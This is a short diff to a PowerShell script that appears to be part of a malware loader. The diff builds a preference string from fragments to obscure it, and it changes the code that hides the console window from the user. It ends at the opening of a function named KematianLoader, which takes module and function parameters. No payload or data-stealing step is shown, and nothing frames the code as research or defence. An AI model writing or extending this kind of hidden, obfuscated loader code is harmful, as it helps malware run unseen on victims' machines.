@@ -1,12 +1,16 @@
 $ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
 
-Add-Type @"
-    [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll")] public static extern IntPtr GetConsoleWindow();
-"@ -Name Win32 -Namespace Win32Functions
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
 
-$consolePtr = [Win32Functions.Win32]::GetConsoleWindow()
-[Win32Functions.Win32]::ShowWindowAsync($consolePtr, 0)  # 0 = SW_HIDE
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+
+$consolePtr = [Console.Window]::GetConsoleWindow()
+#0 hide
+[Console.Window]::ShowWindow($consolePtr, 0)
 
 function KematianLoader {
     Param ($kematian_modules, $kematian_func)
